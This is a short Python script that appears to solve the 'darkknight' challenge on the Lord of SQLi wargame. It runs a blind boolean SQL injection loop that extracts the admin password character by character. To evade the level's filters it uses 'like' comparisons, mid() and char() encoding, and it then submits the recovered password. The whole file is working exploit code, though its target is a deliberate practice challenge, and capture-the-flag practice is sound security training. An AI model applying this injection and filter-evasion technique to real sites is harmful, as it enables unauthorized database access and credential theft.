import requests
from settings import session_id
from bs4_utils import print_html

url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
cookies = {'PHPSESSID': session_id}


def get_pw():
    length = 8
    pw = str()
    for i in range(1, length + 1):
        for j in range(32, 127):
            payload = f"?no=0 || ord(mid(pw,{i},1)) like {j} %26%26 id like char(97,100,109,105,110)"
            res = requests.get(url + payload, cookies=cookies)

            if "Hello admin" in res.text:
                pw += chr(j)
                print(chr(j), end=" ")
                break
    return pw


pw = get_pw()
print()
print("pw :", pw)
params = {
    'pw': pw
}
response = requests.get(url, params=params, cookies=cookies)
print_html(response.text)
